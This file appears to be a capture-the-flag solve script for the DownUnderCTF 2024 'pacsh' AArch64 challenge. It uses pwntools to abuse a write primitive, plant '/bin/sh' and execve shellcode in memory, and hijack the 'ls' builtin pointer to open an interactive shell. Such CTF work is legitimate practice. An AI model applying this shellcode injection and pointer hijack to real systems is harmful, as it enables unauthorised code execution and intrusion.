#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
exe = elf = context.binary = ELF(args.EXE or './pacsh')
# libc = ELF(elf.libc.path)

host = args.HOST or '2024.ductf.dev'
port = int(args.PORT or 30027)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return process(["qemu-aarch64-static", "-g", "1234", "./pacsh"])
        # return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
        # return process(["qemu-aarch64-static", "./pacsh"] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB

# context.log_level = 'debug'
gdbscript = '''
b *main+152
# b *ls+20
continue
'''.format(**locals())

io = start()

io.recvuntil(b"help: ")
help = io.recvline()[:-1]

io.recvuntil(b"ls: ")
ls = io.recvline()[:-1]

io.recvuntil(b"read64: ")
read64 = io.recvline()[:-1]

io.recvuntil(b"write64: ")
write64 = io.recvline()[:-1]

# print(ls[6:])
elf.address = int(ls[6:], 16) - 0x0a54 # not writeable
elf_addr_rw = elf.address + 0x12000

system_call = elf.address + 0xa68

ls_str = elf.address + 0xcc8
bulitin_list = [
    elf_addr_rw + 0x10, # help
    elf_addr_rw + 0x20, # ls
    elf_addr_rw + 0x30, # read64
    elf_addr_rw + 0x40, # write64
]

# write into addr
def writeinto(what, where):
    io.sendlineafter(b"> ", write64)
    payload  = ( where )
    payload += " "
    payload += what
    print(payload)

    io.sendlineafter(b"write64> ", payload)

ret = elf.address + 0x000000000000084c # : ret
# rwx_page = elf.address + 0x1a08000
used_page = elf.address + 0x20000

# add /bin/sh to be used with our shell
writeinto('0068732f6e69622f', hex(used_page))

# write the shell into the page
writeinto('d280000190000000', hex(used_page)[:-2]+"08")
writeinto('d2801ba8d2800002', hex(used_page)[:-2]+"10")
writeinto('d4000001', hex(used_page)[:-2]+"18")

# used_page but we will replce 0x from first and lart 0 with 8
# overwrite ths "ls" address with our shellcode address
writeinto( hex(used_page)[2:][:-1] + "8" , hex(bulitin_list[1] + 8))

# print new address
io.sendlineafter(b"pacsh> ", help)

# get new ls address and jmp to it (our shellcode)
io.recvuntil(b"ls: ")
new_ls = io.recvline()[:-1]
io.sendlineafter(b"pacsh> ", new_ls.decode())

####################################
print(b"="*40)
print(f"help {help.decode()}")
print(f"ls {ls.decode()}")
print(f"read {read64.decode()}")
print(f"write {write64.decode()}")
print(b"="*40)

print(f'system {hex(system_call)}')
print(f"elf addr [r-xp] @ {hex(elf.address)}")
print(f"elf addr [rw-p] @ {hex(elf_addr_rw)}")
print(f"ls str  \t\t@ {hex(ls_str)}")

print(f"New LS {new_ls.decode()}")

"""
Writeable locations
0x5500012000       0x5500013000 rw-p     1000   2000 ./pacsh
0x5500020000       0x5500021000 r--p     1000  10000 ./pacsh
0x5501820000       0x550184c000 rw-p    2c000      0 [stack:1]
0x550185d000       0x550185f000 rw-p     2000  2b000 [linker]


ptr+00: 0068732f6e69622f    # /bin/sh
ptr+08: d280000190000000    # adrp x0, 0 ; mov x1, #0x0
ptr+10: d2801ba8d2800002    # mov x2, #0x0 ; mov x8, #0xdd
ptr+18: d4000001            # svc #0
"""

io.interactive()
